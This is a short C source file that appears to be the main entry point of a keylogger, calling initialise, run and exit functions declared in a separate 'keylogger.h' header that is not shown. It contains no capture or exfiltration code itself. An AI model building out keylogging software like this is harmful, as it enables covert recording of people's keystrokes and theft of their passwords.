#include "keylogger.h"

int main(int argc, char *argv[])
{
    keylogger_init(argv[1]);

    keylogger_run();

    keylogger_exit();

    return 0;
}
